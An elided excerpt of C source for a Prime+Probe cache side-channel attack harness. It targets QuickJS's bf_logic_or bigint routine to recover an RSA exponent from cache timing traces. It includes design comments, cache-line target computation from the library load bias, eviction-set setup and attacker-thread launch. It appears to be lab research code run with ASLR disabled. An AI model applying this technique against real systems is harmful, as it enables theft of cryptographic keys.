 ...
 *
 * ONE probe line, bf_logic_or. It has exactly one caller in the whole library
 * (js_binary_arith_bigint's OP_or case), reached only by SELECT's own `|`, so
 * every access to it comes from the operation under attack. The tradeoff of
 * P+S is that it is *set*-granular where FR is line-granular, so anything else
 * mapping to the same LLC set is counted too; that is acceptable only because
 * the target is exclusive at the level of the call graph.
 *
 * An earlier version also probed bf_add_internal as a control. It was dropped:
 * the decoder's forward-order score (the same gaps against the exponent in the
 * wrong order) is a permutation test over the real signal, and already rules
 * out the decoder manufacturing correlation from trace structure. A second
 * probe in a different LLC set adds no evidence about co-residency in
 * bf_logic_or's set, which is the only exposure P+S introduces over FR.
 *
 ...
 * bytecode-handler line's address is uncertain. Here the target is an exact
 * address derived from the shared library's load bias (ASLR is disabled by
...
/* One probe, and it must be slot 0: slot 0 is the thread that runs the victim's
 * START/PAUSE handshake and dumps the traces (see PS_profile_once and
 * PS_attacker_thread in src/attack/prime_probe.c). */
enum { cache_line_count = 1, profile_iterations = 1 << 20 };
...
static void get_select_targets(void) {
	...
	log_info("libquickjs.so load bias: %lx, target bf_logic_or cache line: %lx",
	         load_bias,
	         target_bf_logic_or);
}
...
static int build_select_evsets(void) {
	...
	EVSet **evsets[cache_line_count] = { &pt_bf_logic_or.evset };
	const char *labels[cache_line_count] = { "bf_logic_or" };
...
static void profile_select_rsa(void) {
	...
	err = pthread_create(&thread0, NULL, PS_attacker_thread, &pt_bf_logic_or);
	if (err != 0)
...
int main(int argc, char **argv) {
	...
	/* Traces have a single column; analysis/decoder.py picks it up
	 * automatically (see signal_slot there). */
	PS_thread_config_init(pt_bf_logic_or);
	pt_bf_logic_or.label = "bf_logic_or";
	pt_bf_logic_or.slot = 0;
	pt_bf_logic_or.pin_cpu = -1;
	pt_bf_logic_or.target = (uint8_t *)target_bf_logic_or;

	if (!build_select_evsets()) {
		log_error("Could not build evset for bf_logic_or");
